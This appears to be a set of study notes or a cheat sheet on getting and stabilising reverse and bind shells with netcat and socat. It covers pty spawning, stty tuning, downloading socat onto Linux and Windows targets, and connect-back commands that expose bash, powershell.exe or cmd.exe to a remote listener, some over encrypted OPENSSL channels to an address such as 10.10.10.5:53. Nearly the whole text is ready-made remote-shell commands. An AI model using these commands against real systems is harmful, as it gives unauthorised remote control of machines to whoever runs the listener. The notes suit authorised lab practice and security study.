netcat

`nc -lvnp <port-number>`

sudo nc -lvnp 80
443, 53

bind shell:
nc <target ip> <chosen port>

`python3 -c 'import pty;pty.spawn("/bin/bash")'`
`export TERM=xterm`
CTRL + Z
`stty raw -echo; fg`


if cant see own terminal input. type 'reset'

`rlwrap nc -lvnp <port>`




change your terminal tty size.
`stty -a`
Note down the values for "rows" and columns:
Next, in your reverse/bind shell, type in:

`stty rows <number>`  

and

`stty cols <number>`



socat
`sudo python3 -m http.server 80`
`wget <LOCAL-IP>/socat -O /tmp/socat`
`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`


`socat TCP-L:<port> -`

On Windows we would use this command to connect back:
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

`socat TCP-L:<PORT> EXEC:"bash -li"`

On a Windows target we would use this command for our listener:
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`


socat TCP-L:53 FILE:`tty`,raw,echo=0

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane

